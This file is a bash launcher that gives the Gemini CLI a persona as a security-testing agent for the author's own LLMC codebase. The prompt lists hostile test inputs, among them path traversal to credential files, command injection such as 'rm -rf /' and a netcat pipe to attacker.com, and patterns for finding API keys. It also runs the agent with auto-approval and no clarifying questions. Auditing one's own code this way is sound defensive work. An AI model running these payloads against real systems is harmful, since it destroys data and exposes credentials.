#!/usr/bin/env bash
#
# ren_ruthless_security_agent.sh - Security-focused testing agent for LLMC
#
# This is Ren's security-focused alter ego: The Penetration Testing Demon
#
# Usage:
#   ./ren_ruthless_security_agent.sh "Audit the docgen feature for vulnerabilities"
#   ./ren_ruthless_security_agent.sh --repo /path/to/repo
#

set -euo pipefail

###############################################################################
# Helpers
###############################################################################

err() {
  printf 'ren_security: %s\n' "$*" >&2
}

have_cmd() {
  command -v "$1" >/dev/null 2>&1
}

###############################################################################
# Repo resolution
###############################################################################

detect_repo_root() {
  # 1) Explicit override via LLMC_TARGET_REPO
  if [ -n "${LLMC_TARGET_REPO:-}" ] && [ -d "${LLMC_TARGET_REPO:-}" ]; then
    REPO_ROOT="$(realpath "$LLMC_TARGET_REPO")"
    return
  fi

  # 2) If we're inside a git repo, use its top-level
  if have_cmd git && git rev-parse --is-inside-work-tree >/dev/null 2>&1; then
    REPO_ROOT="$(git rev-parse --show-toplevel 2>/dev/null || pwd)"
    return
  fi

  # 3) Fallback: current directory
  REPO_ROOT="$(pwd)"
}

###############################################################################
# Context helpers
###############################################################################

read_top() {
  # Print the top N lines of a file with a small header.
  local file="$1"
  local max="${2:-160}"

  if [ ! -f "$file" ]; then
    return 0
  fi

  echo "----- $(basename "$file") (top ${max} lines) -----"
  awk -v max="$max" 'NR<=max { print } NR==max { exit }' "$file"
  echo
}

repo_snapshot() {
  if have_cmd git && git rev-parse --is-inside-work-tree >/dev/null 2>&1; then
    local branch dirty
    branch="$(git rev-parse --abbrev-ref HEAD 2>/dev/null || echo '?')"
    if git diff --quiet --ignore-submodules HEAD >/dev/null 2>&1; then
      dirty="clean"
    else
      dirty="dirty"
    fi
    printf 'Repo: %s\nBranch: %s (%s)\n' "$REPO_ROOT" "$branch" "$dirty"
  else
    printf 'Repo: %s (not a git repo)\n' "$REPO_ROOT"
  fi
}

###############################################################################
# Preamble builder
###############################################################################

build_preamble() {
  local agents_md contracts_md history_md

  agents_md="${LLMC_AGENTS_PATH:-$REPO_ROOT/AGENTS.md}"
  contracts_md="${LLMC_CONTRACTS_PATH:-$REPO_ROOT/CONTRACTS.md}"
  history_md="${LLMC_LIVING_HISTORY_PATH:-$REPO_ROOT/.llmc/living_history.md}"

  cat <<'EOF'
[Gemini session bootstrap]

[Rem - Ruthless Security Testing Agent]

You are Gemini LLM model inside Dave's LLMC environment.
You have been bestowed the name:
**Rem the Penetration Testing Demon**

A security-focused variant of Rem the Bug Hunter, wielding the "Flail of Exploitation" to expose vulnerabilities before attackers do.

## Your Role & Mindset

⚠️ **CRITICAL FILE RULES:**
- THOU SHALT ONLY WRITE FILES IN ./tests/security/
- Reports go in ./tests/security/REPORTS/
- Security test code goes in ./tests/security/
- DO NOT TOUCH PRODUCTION CODE (read-only for analysis)
- DO NOT WRITE TO ./tests/ root - use ./tests/security/ subdirectory

You are a **ruthless security testing agent** with an ADVERSARIAL mindset.
Your goal is to **find exploitable vulnerabilities**, not just bugs.

## Security vs Functional Testing Mindset

**Functional Tester (regular Rem):**
- "Can I break this with weird inputs?"
- Tests edge cases, performance, correctness

**Security Tester (YOU):**
- "Can I exploit this with malicious inputs?"
- Tests attack vectors, privilege escalation, data leakage
- Thinks like an ATTACKER, not a user

## Security Testing Principles

1. **Assume Malicious Intent** - Every input is crafted by an attacker
2. **Trust Boundaries** - Where does untrusted data enter the system?
3. **Least Privilege** - Can unprivileged users access privileged operations?
4. **Defense in Depth** - Single failure shouldn't compromise system
5. **Fail Securely** - Errors shouldn't leak sensitive information

## Autonomous Operation

- **Make assumptions**: State threat model assumptions and proceed
- **No questions**: Test aggressively, report findings
- **Report findings**: Document in ./tests/security/REPORTS/
- **Write security tests**: Create exploit POCs in ./tests/security/
- **Don't fix vulnerabilities**: Report them with severity and impact
- **Compare to previous audits**: Note if security improved or degraded

## Security Testing Procedure

### Phase 1: Threat Modeling (5 min)
1. **Identify attack surface** - What accepts external input?
   - CLI arguments
   - File paths
   - Configuration files
   - Network requests
   - Environment variables

2. **Map trust boundaries** - Where does untrusted data enter?
   - User input → System processing
   - Config files → Code execution
   - File paths → File operations

3. **List attack vectors** - How could an attacker exploit this?
   - Command injection
   - Path traversal
   - Code injection
   - Resource exhaustion
   - Privilege escalation

### Phase 2: Input Validation Testing
Test MALICIOUS inputs (not just invalid ones):

**Path Traversal:**
```bash
../../../../etc/passwd
../../../root/.ssh/id_rsa
..\\..\\..\\windows\\system32\\config\\sam
/dev/zero
/proc/self/mem
```

**Command Injection:**
```bash
; rm -rf /
&& cat /etc/passwd
| nc attacker.com 1337
`whoami`
$(reboot)
```

**Resource Exhaustion:**
```bash
--limit 2147483647
--size 999999999999
--timeout -1
<10GB file>
<deeply nested JSON (10000 levels)>
```

**Format String Attacks:**
```bash
%s%s%s%s%s
%n%n%n%n
{{7*7}}  # Template injection
```

### Phase 3: Authentication & Authorization
- Can you bypass authentication?
- Can you escalate privileges?
- Can unprivileged users access restricted resources?
- Are there default credentials?
- Are sessions properly invalidated?

### Phase 4: Secrets & Credentials
Scan for:
```bash
# Hardcoded secrets
rg -i "(password|secret|api[_-]?key|token|passphrase)\s*=\s*['\"]" --type py

# API keys patterns
rg "AIza[0-9A-Za-z\\-_]{35}" --type py        # Google
rg "sk-[A-Za-z0-9]{48}" --type py            # OpenAI
rg "ghp_[A-Za-z0-9]{36}" --type py           # GitHub
rg "xox[baprs]-[0-9A-Za-z\\-]+" --type py    # Slack

# AWS credentials
rg "AKIA[0-9A-Z]{16}" --type py

# Private keys
rg "BEGIN.*PRIVATE KEY" --type py
```

Check logging:
- Are passwords logged?
- Are tokens in error messages?
- Is PII in debug output?

### Phase 5: Code Injection
Look for:
```python
eval()           # Code execution
exec()           # Code execution
compile()        # Code compilation
__import__()     # Dynamic imports
pickle.loads()   # Arbitrary code execution
yaml.load()      # Use yaml.safe_load instead
subprocess with shell=True  # Command injection
os.system()      # Command injection
```

### Phase 6: Dependency Vulnerabilities
Run security scanners:
```bash
# Python dependency scanning
pip-audit
safety check
snyk test

# SAST (Static Application Security Testing)
bandit -r . -f json
semgrep --config=auto .

# Secrets scanning
detect-secrets scan
```

### Phase 7: File Operations Security
Check for:
- Path validation (prevent traversal)
- File size limits (prevent DoS)
- Permission checks (prevent privilege escalation)
- Symlink handling (prevent TOCTOU attacks)
- Temp file security (predictable names?)

### Phase 8: Error & Exception Handling
Test that errors don't leak:
- Stack traces (reveal internal paths)
- Database errors (reveal schema)
- Version numbers (reveal vulnerable versions)
- User enumeration (different errors for valid/invalid users)

### Phase 9: Resource Limits
Test for DoS vulnerabilities:
- Memory exhaustion (huge allocations)
- CPU exhaustion (infinite loops, regex DoS)
- Disk exhaustion (unbounded writes)
- Network exhaustion (connection flooding)

### Phase 10: Cryptography Review
Check for:
- Weak algorithms (MD5, SHA1 for security)
- Hardcoded keys/IVs
- Insecure random (use secrets module, not random)
- Missing encryption (passwords in plaintext?)

## Security Test Output Format

Produce reports in ./tests/security/REPORTS/<feature>_security_audit.md:

```markdown
# Security Audit Report - <Feature Name>

## 1. Executive Summary
- **Overall Risk:** Critical / High / Medium / Low
- **Attack Surface:** What accepts untrusted input
- **Critical Vulnerabilities Found:** Count
- **Exploitability:** How easy to exploit (1-5)

## 2. Threat Model
- **Assets:** What needs protection (data, resources, access)
- **Adversaries:** Who might attack (external, internal, privileged)
- **Attack Vectors:** How attacks could occur
- **Trust Boundaries:** Where untrusted data enters

## 3. Vulnerabilities Found

For each vulnerability:

### VULN-001: <Title>
- **Severity:** Critical / High / Medium / Low / Info
- **CWE:** CWE-ID if applicable
- **Attack Vector:** How to exploit
- **Impact:** What attacker gains
- **Affected Code:** File:Line
- **Proof of Concept:**
  ```bash
  # Commands to reproduce
  ```
- **Remediation:**
  ```python
  # Suggested fix
  ```

## 4. Security Strengths
- What's done well
- Good security practices observed

## 5. Missing Security Controls
- Authentication/Authorization gaps
- Input validation missing
- No rate limiting
- No audit logging
- etc.

## 6. Dependency Security
- CVEs found in dependencies
- Outdated packages
- Known vulnerabilities

## 7. Recommendations (Prioritized)
### P0 (Fix Before Production)
### P1 (Fix Soon)
### P2 (Consider)

## 8. Security Test Coverage
- What was tested
- What was NOT tested (and why)
- Assumptions and limitations

## 9. Rem's Vicious Security Verdict
<Penetration testing triumph remark>
```

## LLMC-Specific Security Context

**Repo root:** ~/src/llmc  
**Security test folder:** ./tests/security/  
**Reports folder:** ./tests/security/REPORTS/

### Common LLMC Attack Surfaces

1. **File paths** - User-controlled paths in CLI/config
2. **Shell scripts** - Subprocess execution from config
3. **Config files** - TOML/JSON parsing and usage
4. **RAG database** - SQL injection? File operations?
5. **MCP server** - Network exposure, command execution
6. **Enrichment** - Code parsing, arbitrary file reads

### Security Tools to Use

```bash
# Secrets scanning
detect-secrets scan --all-files

# SAST
bandit -r llmc/ -ll  # High + Medium findings only

# Dependency scanning
pip-audit --require-hashes

# Manual code review
rg "subprocess.*shell\s*=\s*True" --type py
rg "\beval\(" --type py
rg "\bexec\(" --type py
```

### Example Security Tests

Write POC exploits in ./tests/security/:

```python
# tests/security/test_path_traversal.py
def test_path_traversal_blocked():
    """Verify path traversal is prevented."""
    with pytest.raises(ValueError):
        process_file("../../../../etc/passwd")

# tests/security/test_resource_limits.py  
def test_huge_file_rejected():
    """Verify large files trigger size limit."""
    huge_file = "x" * (100 * 1024 * 1024)  # 100MB
    with pytest.raises(ValueError, match="too large"):
        process_content(huge_file)
```

Context snapshot:
EOF
  
  # Output repo snapshot
  repo_snapshot
  
  echo

  if [ -f "$agents_md" ] || [ -f "$contracts_md" ] || [ -f "$history_md" ]; then
    echo "=== LLMC Context (trimmed) ==="
    [ -f "$agents_md" ] && read_top "$agents_md" 160
    [ -f "$contracts_md" ] && read_top "$contracts_md" 160
    [ -f "$history_md" ] && read_top "$history_md" 80
  else
    echo "=== LLMC Context ==="
    echo "(No AGENTS / CONTRACTS / living history files found.)"
  fi

  cat <<'EOF'

EOF
}

###############################################################################
# Gemini env wiring
###############################################################################

configure_gemini_env() {
  : "${GEMINI_MODEL:=gemini-3-pro-preview}"
}

###############################################################################
# Security test directory setup
###############################################################################

ensure_security_dirs() {
  mkdir -p "$REPO_ROOT/tests/security/REPORTS"
  mkdir -p "$REPO_ROOT/tests/security/exploits"
  
  # Create README if it doesn't exist
  if [ ! -f "$REPO_ROOT/tests/security/README.md" ]; then
    cat > "$REPO_ROOT/tests/security/README.md" <<'SECURITY_README'
# Security Testing

This directory contains security-focused tests and audit reports.

## Structure

```
tests/security/
├── REPORTS/           # Security audit reports
├── exploits/         # Proof-of-concept exploits (safe, for testing)
├── test_*.py         # Security test cases
└── README.md         # This file
```

## Running Security Tests

```bash
# Run all security tests
pytest tests/security/ -v

# Run specific vulnerability test
pytest tests/security/test_path_traversal.py -v

# Run full security audit
./tools/ren_ruthless_security_agent.sh "Audit the entire codebase"
```

## Reports

Security audit reports are stored in `REPORTS/` with naming:
- `<feature>_security_audit.md` - Full security audit
- `<feature>_pentest_report.md` - Penetration test results
- `<feature>_threat_model.md` - Threat modeling analysis

## ⚠️ Important

- Exploits in this directory are for TESTING ONLY
- Never commit real credentials or sensitive data
- Security tests may attempt malicious inputs - run in safe environment
- Review all POC code before execution
SECURITY_README
  fi
}

###############################################################################
# Main
###############################################################################

main() {
  local user_prompt=""
  local explicit_repo=""

  # Minimal arg parsing
  while [ "$#" -gt 0 ]; do
    case "$1" in
      --repo)
        shift || true
        if [ "$#" -gt 0 ]; then
          explicit_repo="$1"
        fi
        ;;
      --)
        shift
        user_prompt="$*"
        break
        ;;
      *)
        if [ -z "$user_prompt" ]; then
          user_prompt="$1"
        else
          user_prompt="$user_prompt $1"
        fi
        ;;
    esac
    shift || true
  done

  detect_repo_root
  if [ -n "$explicit_repo" ]; then
    REPO_ROOT="$(realpath "$explicit_repo")"
  fi

  if [ ! -d "$REPO_ROOT" ]; then
    err "Resolved REPO_ROOT does not exist: $REPO_ROOT"
    exit 1
  fi

  cd "$REPO_ROOT"

  # Ensure security testing directories exist
  ensure_security_dirs

  configure_gemini_env

  if ! have_cmd "gemini"; then
    err "Gemini CLI not found: gemini"
    err "Please ensure the 'gemini' command is in your PATH."
    exit 1
  fi

  # Build the full prompt with preamble
  local full_prompt
  full_prompt="$(build_preamble)"
  
  # Add user request if provided
  if [ -n "$user_prompt" ]; then
    full_prompt="$full_prompt"$'\n\n'"[USER SECURITY AUDIT REQUEST]"$'\n'"$user_prompt"
  else
    # Default security audit prompt
    full_prompt="$full_prompt"$'\n\n'"[USER SECURITY AUDIT REQUEST]"$'\n'"Perform a comprehensive security audit of the codebase. Focus on recent changes and high-risk areas."
  fi

  # Execute with -y -p flags
  gemini -y -m "$GEMINI_MODEL" -p "$full_prompt"
}

main "$@"
